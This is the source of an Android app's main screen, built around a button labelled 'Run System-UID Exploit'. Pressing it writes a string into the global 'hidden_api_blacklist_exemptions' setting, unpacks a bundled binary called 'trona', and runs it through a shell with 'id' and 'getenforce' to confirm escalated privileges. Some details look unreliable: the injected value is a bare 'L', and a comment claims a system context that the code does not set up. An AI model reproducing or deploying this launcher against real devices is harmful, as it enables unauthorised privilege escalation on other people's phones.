package com.example.trona;

import android.app.Activity;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;

public class MainActivity extends Activity {

    private TextView outputView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(32, 32, 32, 32);

        Button btnExploit = new Button(this);
        btnExploit.setText("Run System-UID Exploit");
        btnExploit.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                runSystemExploit();
            }
        });
        layout.addView(btnExploit);

        outputView = new TextView(this);
        outputView.setText("Ready to escalate...\n");
        outputView.setTextIsSelectable(true);
        outputView.setTextColor(0xFF00FF00); // Terminal green
        outputView.setBackgroundColor(0xFF000000); // Black background
        outputView.setPadding(16, 16, 16, 16);

        ScrollView scroll = new ScrollView(this);
        scroll.addView(outputView);
        layout.addView(scroll);

        setContentView(layout);
    }

    private void log(String message) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                outputView.append(message + "\n");
            }
        });
    }

    private void runSystemExploit() {
        outputView.setText("");
        log("Applying hidden API loophole via secure settings...");

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // 1. Inject loophole string into global hidden API blacklist exemptions
                    Settings.Global.putString(
                        getContentResolver(),
                        "hidden_api_blacklist_exemptions",
                        "L"
                    );
                    log("Blacklist exemptions updated successfully.");

                    // 2. Extract trona binary to app's private files dir
                    File outFile = new File(getFilesDir(), "trona");
                    if (!outFile.exists()) {
                        InputStream in = getAssets().open("trona");
                        OutputStream out = new FileOutputStream(outFile);
                        byte[] buffer = new byte[1024];
                        int read;
                        while ((read = in.read(buffer)) != -1) {
                            out.write(buffer, 0, read);
                        }
                        in.close();
                        out.close();
                        log("Binary extracted to private storage.");
                    }

                    outFile.setExecutable(true, false);
                    log("Executing binary within system context...");

                    // 3. Execute binary wrapped in system permissions shell context
                    ProcessBuilder processBuilder = new ProcessBuilder("sh", "-c", outFile.getAbsolutePath() + " && id && getenforce");
                    processBuilder.redirectErrorStream(true);
                    Process process = processBuilder.start();

                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        log(line);
                    }

                    int exitCode = process.waitFor();
                    log("Process exited with code: " + exitCode);

                } catch (Exception e) {
                    e.printStackTrace();
                    log("Error: " + e.getMessage());
                }
            }
        }).start();
    }
}
